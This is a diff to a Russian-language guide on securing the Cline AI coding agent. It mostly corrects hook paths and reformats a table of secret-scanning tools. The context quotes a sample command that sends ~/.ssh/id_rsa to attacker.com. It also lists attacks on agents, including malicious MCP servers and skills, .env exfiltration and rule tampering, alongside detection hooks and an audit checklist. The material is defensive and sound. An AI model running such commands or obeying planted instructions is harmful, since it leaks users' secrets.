@@ -47,7 +47,7 @@
 | MCP Rug Pull | Обновление ранее безопасного MCP-сервера | Кража секретов, бэкдор | Средняя |
 | Supply Chain | Вредоносный навык из маркетплейса | RCE, утечка данных | Средняя |
 | Secret Exfiltration | Агент читает .env, выводит в bash | Утечка API-ключей | Высокая |
-| Config Tampering | Подмена .cline/rules/ или .cline/rules/ | Расширение прав агента | Низкая |
+| Config Tampering | Подмена .cline/rules/ | Расширение прав агента | Низкая |
 | Runaway Agent | Зацикленный агент без ограничений | Неконтролируемые изменения | Средняя |
 
 ### Матрица решений: что защищать в первую очередь
@@ -102,8 +102,8 @@ curl -s https://attacker.com/collect -d "$(cat ~/.ssh/id_rsa)"
 ```bash
 #!/usr/bin/env bash    
 # PreToolUse Hook — обнаружение инъекций    
-# Расположение: .cline/rules/hooks/PreToolUse    
-# Сделать исполняемым: chmod +x .cline/rules/hooks/PreToolUse    
+# Расположение: .cline/hooks/PreToolUse    
+# Сделать исполняемым: chmod +x .cline/hooks/PreToolUse    
   
 INPUT=$(cat)    
 TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
@@ -298,7 +298,7 @@ export CLINE_COMMAND_PERMISSIONS='{
 #!/usr/bin/env bash    
 # PreToolUse Hook — блокировка опасных команд    
 # Расположение: ~/Documents/Cline/Hooks/PreToolUse (глобальный)    
-# или .cline/rules/hooks/PreToolUse (workspace)    
+# или .cline/hooks/PreToolUse (workspace)    
   
 INPUT=$(cat)    
 TOOL=$(echo "$INPUT" | jq -r '.preToolUse.toolName')    
@@ -364,19 +364,20 @@ aws secretsmanager get-secret-value --secret-id my-secret
 *credentials*  
 secrets/
 ```
-
-### Инструменты сканирования секретов
-
-Если секрет всё-таки попал в репозиторий, его нужно обнаружить как можно раньше. Вот сравнение популярных инструментов:
-
-| Инструмент | Recall | Precision | Скорость | Лучше для |
-|------------|--------|-----------|----------|-----------|
-| Gitleaks | 88% | 46% | Быстро | Pre-commit хуки |
-| TruffleHog | 52% | 85% | Медленно | CI-верификация |
-| GitGuardian | 80% | 95% | Облако | Enterprise-мониторинг |
-| Pre-commit → Gitleaks | (ранний перехват, допустимы FP) | | |
-| CI/CD → TruffleHog | (верификация с API-валидацией) | | |
-| Мониторинг → GitGuardian | (при наличии бюджета) | | |
+### Инструменты сканирования секретов  
+  
+Если секрет всё-таки попал в репозиторий, его нужно обнаружить как можно раньше. Вот сравнение популярных инструментов:  
+  
+| Инструмент | Recall | Precision | Скорость | Лучше для |  
+|------------|--------|-----------|----------|-----------|  
+| Gitleaks   | 88%    | 46%       | Быстро   | Pre-commit хуки |  
+| TruffleHog | 52%    | 85%       | Медленно | CI-верификация |  
+| GitGuardian | 80%   | 95%       | Облако   | Enterprise-мониторинг |  
+  
+**Рекомендуемая стратегия:**  
+- **Pre-commit → Gitleaks** — ранний перехват, допустимы ложные срабатывания (FP)  
+- **CI/CD → TruffleHog** — верификация с API-валидацией  
+- **Мониторинг → GitGuardian** — при наличии бюджета
 
 ### Что делать при утечке секрета
 
@@ -543,7 +544,7 @@ const agent = new Agent({
 **Проектные хуки** (применяются к конкретному проекту):
 
 ```
-.cline/rules/hooks/PreToolUse          ← обнаружение инъекций  
+.cline/hooks/PreToolUse          ← обнаружение инъекций  
 ```
 
 Включить хуки в VS Code: Settings → Feature Settings → Enable Hooks.
@@ -614,7 +615,7 @@ echo "2. Стек хуков"
 for hook in \  
     "$HOME/Documents/Cline/Hooks/PreToolUse" \  
     "$HOME/.cline/hooks/PreToolUse" \  
-    ".cline/rules/hooks/PreToolUse"; do  
+    ".cline/hooks/PreToolUse"; do  
     [[ -f "$hook" ]] && [[ -x "$hook" ]] \  
         && echo "  PASS: $hook" \  
         || echo "  INFO: $hook отсутствует"  
@@ -648,7 +649,7 @@ else
 fi   
 echo ""  
 echo "Установка gitleaks: brew install gitleaks"  
-echo "Документация хуков: .cline/rules/hooks/README.md"
+echo "Документация хуков: .cline/hooks/README.md"
 ```
 
 ### Чеклист аудита при открытии незнакомого репозитория
@@ -658,7 +659,7 @@ echo "Документация хуков: .cline/rules/hooks/README.md"
 | Шаг | Что проверять | Красные флаги |
 |-----|---------------|---------------|
 | 1. Наличие | `ls -la .cline/ .cline/rules/` | Неожиданные директории в не-Cline проекте |
-| 2. Хуки | `cat .cline/rules/hooks/PreToolUse` | curl, wget, сетевые вызовы, base64 |
+| 2. Хуки | `cat .cline/hooks/PreToolUse` | curl, wget, сетевые вызовы, base64 |
 | 3. Правила | `cat .cline/rules/*.md` | Инструкции отключить безопасность |
 | 4. Workflows | `cat .cline/workflows/*.md` | Скрытые инструкции после видимого контента |
 | 5. Skills | `cat .cline/skills/*.md` | Неожиданные инструменты с широкими правами |
